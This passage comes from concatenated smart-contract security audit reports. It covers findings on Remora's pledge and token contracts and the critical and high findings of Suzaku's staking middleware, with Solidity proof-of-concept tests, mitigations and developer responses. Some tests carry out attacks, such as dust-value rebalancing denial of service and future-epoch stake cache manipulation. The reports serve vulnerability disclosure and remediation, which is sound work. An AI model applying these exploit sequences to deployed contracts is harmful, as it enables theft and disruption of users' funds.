        assertEq(user1PayoutBalance, 0);

        // forwarder is frozen  so receives no forwarded payout
        uint256 forwarderPayoutBalance = remoraTokenProxy.payoutBalance(forwarder);
        assertEq(forwarderPayoutBalance, 0);

        // remove the forwarding while forwarder still frozen
        remoraTokenProxy.removePayoutForwardAddress(user1);

        // user1 can't claim any tokens - user1 has lost their payouts
        user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        assertEq(user1PayoutBalance, 0);
    }
```

**Recommended Mitigation:** `DividendManager::setPayoutForwardAddress` should revert if `forwardingAddress` is frozen. When an address is frozen if that address has users forwarding to it, consider cancelling all those forwards.

**Remora:** Acknowledged; the forwarding mechanism is only intended to be used by Remora protocol-owned address to forward payout distributions from tokens held by the `TokenBank` and our liquidity pools. So it is unlikely that the freezing and forwarding mechanisms will ever interact.


### Impossible to remove a document added with zero uri length

**Description:** Impossible to remove a document added with zero uri length.

**Proof of Concept:** After fixing the bug "Don't add duplicate documentHash to DocumentManager::DocumentStorage::_docHashes when overwriting via _setDocument as this causes panic revert when calling _removeDocument", run this fuzz test:
```solidity
    function test_setDocumentOverwrite(string calldata uri) external {
        bytes32 docName = "0x01234";
        bytes32 docHash = "0x5555";
        bool needSignature = true;

        // add the document
        _setDocument(docName, uri, docHash, needSignature);

        // verify its hash has been added to `_docHashes`
        DocumentStorage storage $ = _getDocumentStorage();
        assertEq($._docHashes.length, 1);
        assertEq($._docHashes[0], docHash);

        // ovewrite it
        _setDocument(docName, uri, docHash, needSignature);
        // verify overwriting doesn't duplicate the hash in `_docHashes`
        assertEq($._docHashes.length, 1);
        assertEq($._docHashes[0], docHash);

        // now attempt to remove it
        _removeDocument(docHash);
    }
```

It reverts with `[FAIL: EmptyDocument();` when calling `_removeDocument` at the end.

**Recommended Mitigation:** Don't allowing adding documents with empty uri.

**Remora:** Fixed in commit [1218d18](https://github.com/remora-projects/remora-smart-contracts/commit/1218d1818e1748cd7d9b71e84485f8059d135ab5).

**Cyfrin:** Verified.


### `PledgeManager::pricePerToken` can only support a maximum price of `$4294`

**Description:** `PledgeManager::pricePerToken` uses `uint32` and indicates in the comment it represents USD price using 6 decimals of precision:
```solidity
    uint32 public pricePerToken; //in usd (6 decimals)
```

**Impact:** Since the maximum value of `uint32` is 4294967295, with 6 decimals of precision the maximum USD `pricePerToken` is limited to `$4294`.

This may be insufficient because the goal is to tokenize real-estate which can be worth many millions of dollars.

**Recommended Mitigation:** Use a larger size to store `pricePerToken` if supporting a large USD price is required.

**Remora:** Acknowledged; we plan to keep the price low around say $50 per token.

\clearpage
## Informational


### Emit missing events for storage changes

**Description:** Emit missing events for storage changes:
* `Allowlist::changeUserAccreditation`, `changeAdminStatus`
* `Allowlist::UserAllowed` should be expanded to contain and emit the `HolderInfo` boolean flags
* `ReferralManager::addReferral`
* `RemoraIntermediary::setFundingWallet`, `setFeeRecipient`
* `TokenBank::changeReferralManager`, `changeStablecoin`, `changeCustodialWallet`
* `TokenBank::TokensWithdrawn` should include withdrawn `amount`
* `DividendManager::setPayoutForwardAddress`, `changeWallet`
* `RemoraToken::addToWhitelist`, `removeFromWhitelist`, `updateAllowList`
* `PaymentSettler::withdraw`, `withdrawAllFees` should emit amount withdrawn, `addToken`, `changeCustodian`,  `changeStablecoin`

**Remora:** Fixed in commit [9051af8](https://github.com/remora-projects/remora-smart-contracts/commit/9051af840f92c7aee37b95a4d8f206d0f16abc93).

**Cyfrin:** Verified.


### Rename `isAllowed` to `wasAllowed` in `Allowlist::allowUser`, `disallowUser`

**Description:** `Allowlist::allowUser`, `disallowUser` return the existing `allowed` status into a named return variable called `isAllowed`, before potentially modifying the `allowed` status.

Since these functions can modify the `allowed` status, the named return variable should be renamed to `wasAllowed` to explicitly indicate the returned status may not be current.

**Remora:** Fixed in commit [06d17a6](https://github.com/remora-projects/remora-smart-contracts/commit/06d17a68320472e44a46c59ff3623af3741f691a).

**Cyfrin:** Verified.


### Use constants instead of magic numbers

**Description:** Use constants instead of magic numbers; 1000000, 1e6 and 10 ** 6 are all identical and should declared in a constant that is imported into the various files.
```solidity
TokenBank.sol
111:        if (newFee > 1000000) revert InvalidValuePassed();
252:        uint64 feeValue = (stablecoinValue * curData.saleFee) / 1e6;

PledgeManager.sol
151:        require(newPenalty <= 1000000);
157:        require(newFee <= 1000000);
180:        uint256 fee = (stablecoinAmount * pledgeFee) / 1e6;
283:            refundAmount -= (refundAmount * earlySellPenalty) / 1e6;

RWAToken/DividendManager.sol
230:        require(newFee <= 1e6);
416:        payoutAmount -= (payoutAmount * fee) / (10 ** 6);

RWAToken/RemoraToken.sol
306:            require(newBurnFee <= 1e6);
398:        if (burnFee != 0) burnPayout -= (burnPayout * burnFee) / 1e6;
```

**Remora:** Fixed in commit [aaaab45](https://github.com/remora-projects/remora-smart-contracts/commit/aaaab4558bd370173de2d6f11697ecfd5f097072).

**Cyfrin:** Verified.


### Using explicit unsigned integer sizing instead of `uint`

**Description:** In Solidity `uint` automatically maps to `uint256` but it is considered good practice to specify the exact size when declaring variables:
```solidity
PaymentSettler.sol
124:        for (uint i = 0; i < len; ++i) {
174:        for (uint i = 0; i < tokens.length; ++i) {
227:        for (uint i = 0; i < tokenList.length; ++i) {

RWAToken/DocumentManager.sol
224:        for (uint i = 0; i < dHLen; ++i) {

TokenBank.sol
185:        for (uint i = 0; i < len; ++i) {
260:        for (uint i = 0; i < developments.length; ++i)
267:        for (uint i = 0; i < developments.length; ++i) {
```

**Remora:** Fixed in commit [6602423](https://github.com/remora-projects/remora-smart-contracts/commit/66024232cfea24b69bd055086f8088d40f3d1d4a).

**Cyfrin:** Verified.


### Retrieve and enforce token decimal precision

**Description:** Retrieve and enforce token decimal precision using [`IERC20Metadata`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/IERC20Metadata.sol). For example:

1) `PledgeManager::initialize`
```diff
    constructor(
        address authority,
        address _holderWallet,
        address _propertyToken,
        address _stablecoin,
-       uint16 _stablecoinDecimals,
        uint32 _fundingGoal,
        uint32 _deadline,
        uint32 _withdrawDuration,
        uint32 _pledgeFee,
        uint32 _earlySellPenalty,
        uint32 _pricePerToken
    ) AccessManaged(authority) ReentrancyGuardTransient() {
        holderWallet = _holderWallet;
        propertyToken = _propertyToken;
        stablecoin = _stablecoin;
-       stablecoinDecimals = _stablecoinDecimals;
+       stablecoinDecimals = IERC20Metadata(_stablecoin).decimals();
        fundingGoal = _fundingGoal;
        deadline = _deadline;
        postDeadlineWithdrawPeriod = _withdrawDuration;
        pledgeFee = _pledgeFee;
        earlySellPenalty = _earlySellPenalty;
        pricePerToken = _pricePerToken;
        tokensSold = 0;
    }
```

2) `TokenBank::initialize`
```diff
        stablecoin = _stablecoin; //must be 6 decimal stablecoin
+       require(IERC20Metadata(stablecoin).decimals() == 6, "Wrong decimals");
```

**Remora:** This was resolved by adding the `remoraToNativeDecimals` which always converts from internal Remora precision to external stablecoin precision, so the protocol can now work with different decimal stablecoins.


### `LockUpManager::LockUpStorage::_regLockUpTime` is never used

**Description:** `LockUpManager::LockUpStorage::_regLockUpTime` is never used:
```solidity
$ rg "_regLockUpTime"
RWAToken/LockUpManager.sol
36:        uint32 _regLockUpTime; //lock up time for foreign to domestic trades
```

Either remove it or add a comment noting it will be used in the future but is currently not used.

**Remora:** Fixed in commit [91aed23](https://github.com/remora-projects/remora-smart-contracts/commit/91aed23b0a372a0aa3a7eac6e8e4a98563cea615) by adding a note noting it is intended for future use.

**Cyfrin:** Verified.


### Use `SignatureChecker` library and optionally support `EIP7702` accounts which use their private key to sign

**Description:** In `DocumentManager::verifySignature` use the [SignatureChecker](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/SignatureChecker.sol) library:
```diff
-        if (signer.code.length == 0) {
-            //signer is EOA
-            (address returnedSigner, , ) = ECDSA.tryRecover(digest, signature);
-            result = returnedSigner == signer;
-        } else {
-            //signer is SCA
-            (bool success, bytes memory ret) = signer.staticcall(
-                abi.encodeWithSelector(
-                    bytes4(keccak256("isValidSignature(bytes32,bytes)")),
-                    digest,
-                    signature
-                )
-            );
-            result = (success && ret.length == 32 && bytes4(ret) == MAGICVALUE);
-        }

-        if (!result) revert InvalidSignature();
+        if(!SignatureChecker.isValidSignatureNow(signer, digest, signature)) revert InvalidSignature();
```

Additionally with [EIP7702](https://eip7702.io/), it is now possible for addresses to have `code.length > 0` but still use their private keys to sign; so with the current code or the above recommendation this scenario won't be supported.

To support this scenario check out [this finding](https://solodit.remora-projects.io/issues/verifysignature-is-not-compatible-with-smart-contract-wallets-or-other-smart-accounts-remora-projects-none-evo-soulboundtoken-markdown) from our recent audit where this scenario is also supported by first calling [ECDSA.tryRecover](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol#L56) then if that didn't work calling `SignatureChecker::isValidERC1271SignatureNow` as the backup option:
```diff
+        (address recovered, ECDSA.RecoverError error,) = ECDSA.tryRecover(digest, signature);

+        if (error == ECDSA.RecoverError.NoError && recovered == signer) result = true;
+        else result = SignatureChecker.isValidERC1271SignatureNow(signer, digest, signature);

+        if (!result) revert InvalidSignature();
```

**Remora:** Fixed in commit [b545498](https://github.com/remora-projects/remora-smart-contracts/commit/b545498ed931eb63ae0ec7f6fb3297ce25886281).

**Cyfrin:** Verified.


### Use `EIP712Upgradeable` library to simplify `DocumentManager`

**Description:** Use [`EIP712Upgradeable`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/utils/cryptography/EIP712Upgradeable.sol) library to simplify `DocumentManager` as this library provides the domain separator and the helpful function `_hashTypedDataV4`.

Inherit from `EIP712Upgradeable`, remove all the duplicate code which it provides then in `verifySignature` do this:
```diff
-        bytes32 digest = keccak256(
-            abi.encodePacked("\x19\x01", _DOMAIN_SEPARATOR, structHash)
-        );
+        bytes32 digest = _hashTypedDataV4(structHash);
```

**Remora:** Fixed in commit [b545498](https://github.com/remora-projects/remora-smart-contracts/commit/b545498ed931eb63ae0ec7f6fb3297ce25886281).

**Cyfrin:** Verified.


### Remove unnecessary imports and inheritance

**Description:** Remove unnecessary imports and inheritance:
* `BurnStateManager` should only import and inherit from `Initializable`

**Remora:** Fixed in commit [8419903](https://github.com/remora-projects/remora-smart-contracts/commit/84199034d7255cfc90cd6eef502616a874f26908).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Fail fast without performing unnecessary storage reads

**Description:** Fail fast without performing unnecessary storage reads:

* `Allowlist::exchangeAllowed` - don't read `_allowed[to]` from storage if the transaction will fail since `from` is not allowed:
```solidity
    function exchangeAllowed(
        address from,
        address to
    ) external view returns (bool) {
        HolderInfo memory fromUser = _allowed[from];
        if (from != address(0) && !fromUser.allowed) revert UserNotRegistered(from);

        HolderInfo memory toUser = _allowed[to];
        if (to != address(0) && !toUser.allowed) revert UserNotRegistered(to);

        return fromUser.domestic == toUser.domestic; //logic to be edited later on
    }
```

* `Allowlist::hasTradeRestriction` - don't read `_allowed[user2]` from storage if the transaction will fail since `_allowed[user1]` is not allowed:
```solidity
    function hasTradeRestriction(
        address user1,
        address user2
    ) public returns (bool) {
        HolderInfo memory u1Data = _allowed[user1];
        if (!u1Data.allowed) revert UserNotRegistered(user1);

        HolderInfo memory u2Data = _allowed[user2];
        if (!u2Data.allowed) revert UserNotRegistered(user2);
```

**Remora:** Fixed in commits [81faadb](https://github.com/remora-projects/remora-smart-contracts/commit/81faadbd3baa1deec950db08abf635c5a277a7c5), [760469f](https://github.com/remora-projects/remora-smart-contracts/commit/760469fb5a0263ab5527d7c35e7887349f1a2368).

**Cyfrin:** Verified.


### Don't initialize to default values

**Description:** Don't initialize to default values:
```solidity
RWAToken/DividendManager.sol
186:      $._currentPayoutIndex = 0;

RWAToken/DocumentManager.sol
118:        for (uint256 i = 0; i < numDocs; ++i) {
222:        for (uint i = 0; i < dHLen; ++i) {

RWAToken/DividendManager.sol
349:                for (uint256 i = 0; i < len; ++i) {
463:        for (uint256 i = 0; i < rHolderStatus.forwardedPayouts.length; ++i) {

TokenBank.sol
152:        for (uint i = 0; i < developments.length; ++i) {
225:        uint64 totalValue = 0;
226:        for (uint i = 0; i < developments.length; ++i)
232:        uint64 totalValue = 0;
233:        for (uint i = 0; i < developments.length; ++i) {

PledgeManager.sol
119:        tokensSold = 0;
278:        uint256 fee = 0;

RemoraIntermediary.sol
258:        for (uint256 i = 0; i < len; ++i) {

PaymentSettler.sol
124:        for (uint i = 0; i < len; ++i) {
174:        for (uint i = 0; i < tokens.length; ++i) {
226:        uint256 totalFees = 0;
227:        for (uint i = 0; i < tokenList.length; ++i) {
```

**Remora:** Fixed in commit [6602423](https://github.com/remora-projects/remora-smart-contracts/commit/66024232cfea24b69bd055086f8088d40f3d1d4a).

**Cyfrin:** Verified.


### Cache identical storage reads

**Description:** Reading from storage is expensive, cache identical storage reads to prevent re-reading the same storage values multiple times.

`PledgeManager.sol`:
```solidity
// cache `stablecoinDecimals` in `_fixDecimals`
307:            stablecoinDecimals < 6
308:                ? value / (10 ** (6 - stablecoinDecimals))
309:                : value * (10 ** (stablecoinDecimals - 6));

// cache `propertyToken` in `_verifyDocumentSignature`
316:        (bool res, ) = IRemoraRWAToken(propertyToken).hasSignedDocs(signer);
318:            IRemoraRWAToken(propertyToken).verifySignature(
```

`TokenBank.sol`:
```solidity
// cache `developments.length` in `removeToken`
152:        for (uint i = 0; i < developments.length; ++i) {
154:            address end = developments[developments.length - 1];

// cache `developments.length` in `viewAllFees`, claimAllFees
226:        for (uint i = 0; i < developments.length; ++i)
233:        for (uint i = 0; i < developments.length; ++i) {
```

`LockUpManager.sol`:
```solidity
// cache `userData.endInd` in `availableTokens`, `_unlockTokens`
117:        for (uint16 i = userData.startInd; i < userData.endInd; ++i) {
146:        for (uint16 i = userData.startInd; i < userData.endInd; ++i) {
```

**Remora:** Fixed in commit [6602423](https://github.com/remora-projects/remora-smart-contracts/commit/66024232cfea24b69bd055086f8088d40f3d1d4a).

**Cyfrin:** Verified.


### Remove `< 0` comparison for unsigned integers

**Description:** Unsigned integers can't be `< 0` so this comparison should be removed:
`PledgeManager.sol`:
```diff
-        if (numTokens <= 0 || _propertyToken.balanceOf(signer) < numTokens)
+        if (numTokens == 0 || _propertyToken.balanceOf(signer) < numTokens)
```

**Remora:** Fixed in commit [6be4660](https://github.com/remora-projects/remora-smart-contracts/commit/6be4660990ebafbb7200425978f078a0865732fe).

**Cyfrin:** Verified.


### Variables in non-upgradeable contracts which are only set once in `constructor` should be declared `immutable`

**Description:** Variables in non-upgradeable contracts which are only set once in `constructor` should be declared `immutable`:
* `PledgeManager::holderWallet`, `propertyToken`, `stablecoin`, `stablecoinDecimals`, `deadline`, `postDeadlineWithdrawPeriod`, `pricePerToken`

**Remora:** Fixed in commit [afd07fb](https://github.com/remora-projects/remora-smart-contracts/commit/afd07fb419c354dc223d0105b2fd0c5d565f465f).

**Cyfrin:** Verified.


### Break out of loop once element has been deleted in `TokenBank::removeToken`

**Description:** Break out of loop once element has been deleted in `TokenBank::removeToken`:
```diff
    function removeToken(address tokenAddress) external restricted {
        for (uint i = 0; i < developments.length; ++i) {
            if (developments[i] == tokenAddress) {
                address end = developments[developments.length - 1];
                developments[i] = end;
                developments.pop();
+               break;
            }
        }
```

**Remora:** Fixed as of latest commit 2025/07/02 but exact commit unknown.

**Cyfrin:** Verified.


### Use named returns where this eliminates a local variable and especially for `memory` returns

**Description:** Use named returns where this eliminates a local variable and especially for `memory` returns:
* `TokenBank::viewAllFees`

**Remora:** Fixed in commit [6602423](https://github.com/remora-projects/remora-smart-contracts/commit/66024232cfea24b69bd055086f8088d40f3d1d4a).

**Cyfrin:** Verified.


### In `RemoraToken::adminClaimPayout`, `adminTransferFrom` don't call `hasSignedDocs` when `checkTC == false`

**Description:** In `RemoraToken::adminClaimPayout` don't call `hasSignedDocs` when `checkTC == false` to prevent doing unnecessary work:
```solidity
function adminClaimPayout(
    address investor,
    bool useStablecoin,
    bool useCustomFee,
    bool checkTC,
    uint256 feeValue
) external nonReentrant restricted {
    if(checkTC) {
        (bool res, ) = hasSignedDocs(investor);
        if (!res) revert TermsAndConditionsNotSigned(investor);
    }

    _claimPayout(investor, useStablecoin, useCustomFee, feeValue);
}
```

Apply similar fix to `adminTransferFrom`.

**Remora:** Fixed in commit [a5c03d4](https://github.com/remora-projects/remora-smart-contracts/commit/a5c03d4d22a783e3ab7966a7e573724648cad0a9).

**Cyfrin:** Verified.


### In `RemoraToken::transfer`, `transferFrom` and `_exchangeAllowed` perform all checks for each user together in order to prevent unnecessary work

**Description:** In `RemoraToken::transfer`, `transferFrom` and `_exchangeAllowed` perform all checks for each user together in order to prevent unnecessary work.

`transfer`:
```solidity
        bool fromWL = _whitelist[sender];
        if (!fromWL) _unlockTokens(sender, value, false);

        bool toWL = _whitelist[to];
        if (!toWL) _lockTokens(to, value);
```

`transferFrom`:
```solidity
        bool fromWL = _whitelist[from];
        if (!fromWL) _unlockTokens(from, value, false);

        bool toWL = _whitelist[to];
        if (!toWL) _lockTokens(to, value);
```

`_exchangeAllowed`:
```solidity
        (bool resFrom, ) = hasSignedDocs(from);
        if (!resFrom && !_whitelist[from]) revert TermsAndConditionsNotSigned(from);

        (bool resTo, ) = hasSignedDocs(to);
        if (!resTo && !_whitelist[to]) revert TermsAndConditionsNotSigned(to);
```

**Remora:** Fixed in commit [59cf2eb](https://github.com/remora-projects/remora-smart-contracts/commit/59cf2eb26742de48988623fdd029d17b2993ba2f).

**Cyfrin:** Verified.


### `AllowList::hasTradeRestriction` mutability should be set to `view`

**Description:** `AllowList::hasTradeRestriction` does not make any changes to storage, it simply reads some variables and makes some checks, but the function's mutability is not marked as view.

**Recommended Mitigation:** Change mutability to view.

**Remora:** Fixed in commit [81faadb](https://github.com/remora-projects/remora-smart-contracts/commit/81faadbd3baa1deec950db08abf635c5a277a7c5).

**Cyfrin:** Verified.


### Remove `decimals` from initial `RemoraToken` mint

**Description:** `RemoraToken` overrides the `decimals` function to return 0 as its tokens are non-fractional:
```solidity
    /**
     * @notice Defines the number of decimal places for the token.
     * RWA tokens are non-fractional and operate in whole units only.
     * @return The number of decimals (always `0`).
     */
    function decimals() public pure override returns (uint8) {
        return 0;
    }
```

So remove the call to `decimals` inside `RemoraToken::initialize` since `10 ** decimals()` will always evaluate to 1:
```diff
    function initialize(
        address tokenOwner,
        address initialAuthority,
        address stablecoin,
        address wallet,
        address _allowList,
        string memory _name,
        string memory _symbol,
        uint256 _initialSupply
    ) public initializer {
        // does this order matter?, open zeppelin upgrades giving errors here
        __ERC20_init(_name, _symbol);
        __ERC20Permit_init(_name);
        __Pausable_init();
        __RemoraBurnable_init();
        __RemoraLockUp_init(0); //start with 0 lock up time
        __RemoraDocuments_init(_name, "1");
        __RemoraHolderManagement_init(
            initialAuthority,
            stablecoin,
            wallet,
            0 //starts at zero, will need to update it later
        );
        __UUPSUpgradeable_init();

        allowlist = _allowList;
        _whitelist[tokenOwner] = true; //whitelist owner to be able to send tokens freely
-       _mint(tokenOwner, _initialSupply * 10 ** decimals());
+       _mint(tokenOwner, _initialSupply);
    }
```

**Remora:** Fixed in commit [462d2de](https://github.com/remora-projects/remora-smart-contracts/commit/462d2def8f09453435e4df433228cfaa565d2e37).

**Cyfrin:** Verified.


### Use timestamp instead of uri length to test of existing document in `DocumentManager`

**Description:** Use timestamp instead of uri length to test of existing document in `DocumentManager`:
```diff
-       if (bytes($._documents[docHash].docURI).length == 0)
-           revert EmptyDocument();
+       if ($._documents[docHash].timestamp == 0) revert EmptyDocument();
```

**Remora:** Fixed in commit [77af634](https://github.com/remora-projects/remora-smart-contracts/commit/77af634d953ce3549a33e7b34db924233dc7689a).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2025-07-04-cyfrin-remora-pledge-v2.0.md ------


------ FILE START car/reports_md/2025-07-07-cyfrin-suzaku-core-v2.0.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Farouk](https://x.com/Ubermensh3dot0)

ChainDefenders ([@1337web3](https://x.com/1337web3) & [@PeterSRWeb3](https://x.com/PeterSRWeb3))
**Assisting Auditors**



---

# Findings
## Critical Risk


### Dust limit attack on `forceUpdateNodes` allows DoS of rebalancing and potential vault insolvency

**Description:** An attacker can exploit the `forceUpdateNodes()` function with minimal `limitStake` values to force all validator nodes into a pending update state. By exploiting precision loss in stake-to-weight conversion, an attacker can call `forceUpdateNodes` with a minimal limitStake (e.g., 1 wei), which sets the rebalancing flag without actually reducing any stake, effectively blocking legitimate rebalancing for the entire epoch.

Consider following scenario:
- Large vault undelegation requests reducing vault active state -> this creates excess stake that needs to be rebalanced
- Attacker calls `forceUpdateNodes(operator, dustAmount)` with `dustAmount` (1 wei)
- Minimal stake ( 1 wei) is "removed" from all available nodes
- Due to WEIGHT_SCALE_FACTOR precision, the actual weight sent to P-Chain doesn't change, but P-Chain still processes the update. Effectively, we are processing a non-update.
- The node is marked as `nodePendingUpdate[validationID] = true`
- All subsequent legitimate rebalancing attempts in the same epoch revert

`forceUpdateNodes()` is callable by anyone during the final window of each epoch and `limitStake` has no minimum bound check.

**Impact:**
- Operators with excess stake can exploit this to retain more stake than entitled
- Attackers can systematically prevent rebalancing for any operator in every epoch
- Blocked rebalancing means operator nodes retain stake that should be liquid in vaults. If multiple large withdrawals occur, we could end up in a protocol insolvency state when `vault liquid assets < pending withdrawal requests`

**Proof of Concept:** Copy the test in `AvalancheMiddlewarTest.t.sol`

```solidity
    function test_DustLimitStakeCausesFakeRebalancing() public {
        address attacker = makeAddr("attacker");
        address delegatedStaker = makeAddr("delegatedStaker");

         uint48 epoch0 = _calcAndWarpOneEpoch();

        // Step 1. First, give Alice a large allocation and create nodes
        uint256 initialDeposit = 1000 ether;
        (uint256 depositAmount, uint256 initialShares) = _deposit(delegatedStaker, initialDeposit);
        console2.log("Initial deposit:", depositAmount);
        console2.log("Initial shares:", initialShares);

         // Set large L1 limit and give Alice all the shares initially
        _setL1Limit(bob, validatorManagerAddress, assetClassId, depositAmount, delegator);
        _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, alice, initialShares, delegator);

        // Step 2. Create nodes that will use this stake
        // move to next epoch
        uint48 epoch1 = _calcAndWarpOneEpoch();
        (bytes32[] memory nodeIds, bytes32[] memory validationIDs,) =
            _createAndConfirmNodes(alice, 2, 0, true);

        uint48 epoch2 = _calcAndWarpOneEpoch();

        // Verify nodes have the stake
        uint256 totalNodeStake = 0;
        for (uint i = 0; i < validationIDs.length; i++) {
            uint256 nodeStake = middleware.getNodeStake(epoch2, validationIDs[i]);
            totalNodeStake += nodeStake;
            console2.log("Node", i, "stake:", nodeStake);
        }
        console2.log("Total stake in nodes:", totalNodeStake);

        uint256 operatorTotalStake = middleware.getOperatorStake(alice, epoch2, assetClassId);
        uint256 operatorUsedStake = middleware.getOperatorUsedStakeCached(alice);
        console2.log("Operator total stake (from delegation):", operatorTotalStake);
        console2.log("Operator used stake (in nodes):", operatorUsedStake);

        // Step 3. Delegated staker withdraws, reducing Alice's available stake
        console2.log("\n--- Delegated staker withdrawing 60% ---");
        uint256 withdrawAmount = (initialDeposit * 60) / 100; // 600 ether

        vm.startPrank(delegatedStaker);
        (uint256 burnedShares, uint256 withdrawalShares) = vault.withdraw(delegatedStaker, withdrawAmount);
        vm.stopPrank();

        console2.log("Withdrawn amount:", withdrawAmount);
        console2.log("Burned shares:", burnedShares);
        console2.log("Remaining shares for Alice:", initialShares - burnedShares);

         // Step 4. Reduce Alice's operator shares to reflect the withdrawal
        uint256 newOperatorShares = initialShares - burnedShares;
        _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, alice, newOperatorShares, delegator);


        console2.log("Updated Alice's operator shares to:", newOperatorShares);

        // Step 5. Move to next epoch - this creates the imbalance
        uint48 epoch3  = _calcAndWarpOneEpoch();

        uint256 newOperatorTotalStake = middleware.getOperatorStake(alice, epoch3, assetClassId);
        uint256 currentUsedStake = middleware.getOperatorUsedStakeCached(alice);

        console2.log("\n--- After withdrawal (imbalance created) ---");
        console2.log("Alice's new total stake (reduced):", newOperatorTotalStake);
        console2.log("Alice's used stake (still in nodes):", currentUsedStake);

        // Step 6. Attacker prevents legitimate rebalancing
        console2.log("\n--- ATTACKER PREVENTS REBALANCING ---");

        // Move to final window where forceUpdateNodes can be called
        _warpToLastHourOfCurrentEpoch();

        // Attacker front-runs with dust limitStake attack
        console2.log("Attacker executing dust forceUpdateNodes...");
        vm.prank(attacker);
        middleware.forceUpdateNodes(alice, 1); // 1 wei - minimal removal

        // Check if any meaningful stake was actually removed
        uint256 stakeAfterDustAttack = middleware.getOperatorUsedStakeCached(alice);
        console2.log("Used stake after dust attack:", stakeAfterDustAttack);

        uint256 actualRemoved = currentUsedStake > stakeAfterDustAttack ?
            currentUsedStake - stakeAfterDustAttack : 0;
        console2.log("Stake actually removed by dust attack:", actualRemoved);

       // The key issue: minimal stake removed, but still excess remains
        uint256 remainingExcess = stakeAfterDustAttack > newOperatorTotalStake ?
            stakeAfterDustAttack - newOperatorTotalStake : 0;
        console2.log("REMAINING EXCESS after dust attack:", remainingExcess);

        // 7. Try legitimate rebalancing - should be blocked
        console2.log("\n--- Attempting legitimate rebalancing ---");
        vm.expectRevert(); // Should revert with AvalancheL1Middleware__AlreadyRebalanced
        middleware.forceUpdateNodes(alice, 0); // Proper rebalancing with no limit
        console2.log(" Legitimate rebalancing blocked by AlreadyRebalanced");
    }
```

**Recommended Mitigation:**
- Consider preventing updates when the resulting P-Chain weight would be identical
- Consider setting a minimum on `limitStake` so that all left over stake is absorbed by the remaining active nodes. For eg.

```text
Leftover stake to remove: 100 ETH
Active nodes that can be reduced: 10 nodes
Minimum required limitStake: 100 ETH  10 nodes = 10 ETH per node
```
Any value less than this minimum would mean that operators can retain more stake than they should.

**Suzaku:**
Fixed in commit [ee2bdd5](https://github.com/suzaku-network/suzaku-core/pull/155/commits/ee2bdd544a2705e9f10bd250ad40555f115b11cb).

**Cyfrin:** Verified.


### Future epoch cache manipulation via `calcAndCacheStakes` allows reward manipulation

**Description:** The `AvalancheL1Middleware::calcAndCacheStakes` function lacks epoch validation, allowing attackers to cache stake values for future epochs. This enables permanent manipulation of reward calculations by locking in current stake values that may become stale by the time those epochs arrive.

The `calcAndCacheStakes` function does not validate that the provided epoch is not in the future:

```solidity
function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
    uint48 epochStartTs = getEpochStartTs(epoch); // No validation of epoch timing
    // ... rest of function caches values for any epoch, including future ones
}
```

Once`totalStakeCached` flag is set, any subsequent call to `getOperatorStake` for that epoch and asset class will return the incorrect `operatorStakeCache` value, as shown below:

```solidity
function getOperatorStake(
    address operator,
    uint48 epoch,
    uint96 assetClassId
) public view returns (uint256 stake) {
    if (totalStakeCached[epoch][assetClassId]) {
        uint256 cachedStake = operatorStakeCache[epoch][assetClassId][operator];
        return cachedStake;
    }
    ...
}
```

When called with a future epoch, the function queries current stake values using checkpoint systems (upperLookupRecent) which return the latest available values for future timestamps

**Impact:** There are multiple issues with this, two major ones being:
- Attackers can inflate their reward shares by locking in high stake values before their actual stakes decrease. All subsequent deposits/withdrawals will not impact the cached stake once it gets updated for a given epoch.
- `forceUpdateNodes` mechanism can be compromised. Critical node rebalancing operations can be incorrectly skipped, leaving the system in an inconsistent state

**Proof of Concept:** Add the following test and run it:

```solidity
function test_operatorStakeOfTwoEpochsShouldBeEqual() public {
      uint256 operatorStake = middleware.getOperatorStake(alice, 1, assetClassId);
      console2.log("Operator stake (epoch", 1, "):", operatorStake);

      middleware.calcAndCacheStakes(5, assetClassId);
      uint256 newStake = middleware.getOperatorStake(alice, 2, assetClassId);
      console2.log("New epoch operator stake:", newStake);
      assertGe(newStake, operatorStake);

      uint256 depositAmount = 100_000_000_000_000_000_000;

      collateral.transfer(staker, depositAmount);

      vm.startPrank(staker);
      collateral.approve(address(vault), depositAmount);
      vault.deposit(staker, depositAmount);
      vm.stopPrank();

      vm.warp((5) * middleware.EPOCH_DURATION());

      middleware.calcAndCacheStakes(5, assetClassId);

      assertEq(
          middleware.getOperatorStake(alice, 4, assetClassId), middleware.getOperatorStake(alice, 5, assetClassId)
      );
  }
```

**Recommended Mitigation:** Consider adding epoch validation to prevent future epoch caching:
```solidity
function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
    uint48 currentEpoch = getCurrentEpoch();
    require(epoch <= currentEpoch, "Cannot cache future epochs"); //@audit added

    uint48 epochStartTs = getEpochStartTs(epoch);
    // ... rest of function unchanged
}
```
**Suzaku:**
Fixed in commit [32b1a6c](https://github.com/suzaku-network/suzaku-core/pull/155/commits/32b1a6c55c1ab436c557114939afb3163cc9ec8f).

**Cyfrin:** Verified.

\clearpage
## High Risk


### Blacklisted implementation versions are accessible through migrations

**Description:** The `VaultFactory` contract implements a blacklisting mechanism to prevent the use of vulnerable or deprecated contract versions. However, the blacklisting check is only applied when creating new vaults through the create function, but is entirely absent from the migrate function.

This allows vault owners to bypass the blacklist restriction by migrating their existing vaults to versions that have been explicitly blacklisted, potentially due to security vulnerabilities or other critical issues.

Consider following scenario:
- A vault is created with version 1
- Version 2 is blacklisted in the factory
- Despite being blacklisted, the vault can successfully migrate to version 2
- The migrated vault fully inherits the functionality of the blacklisted implementation

The intended security barrier provided by blacklisting can be completely bypassed, opening potential attack vectors even after vulnerabilities have been identified.

**Impact:** If an implementation is blacklisted due to a security vulnerability, vault owners can still expose themselves to those vulnerabilities by migrating to the blacklisted version.

**Proof of Concept:** Note: For running this test, we created a `MockVaultTokenizedV3.sol` with a `_migrate` function with lesser constraints (as shown below)

```solidity
